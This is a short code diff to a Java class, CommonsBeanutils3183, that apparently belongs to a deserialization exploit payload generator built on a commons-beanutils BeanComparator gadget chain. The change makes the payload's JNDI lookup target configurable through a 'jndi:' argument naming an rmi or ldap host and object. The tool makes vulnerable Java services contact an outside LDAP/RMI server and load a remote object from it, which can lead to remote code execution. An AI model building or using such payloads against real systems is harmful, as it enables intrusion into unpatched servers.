@@ -28,7 +28,13 @@ public class CommonsBeanutils3183 {
     }
 
     public static byte[] getBytes(PayloadType type, String... param) throws Exception {
-        String jndiURL = "ldap://" + Config.ip + Config.ldapPort;
+        String command = String.valueOf(type);
+        String jndiURL = null;
+        if (command.toLowerCase().startsWith("jndi:")) {
+            jndiURL = command.substring(5);
+        } else {
+            throw new Exception("Command format is: [rmi|ldap]://host:port/obj");
+        }
 
         ClassPool pool = ClassPool.getDefault();
         pool.insertClassPath(new ClassClassPath(Class.forName("org.apache.commons.beanutils.BeanComparator")));
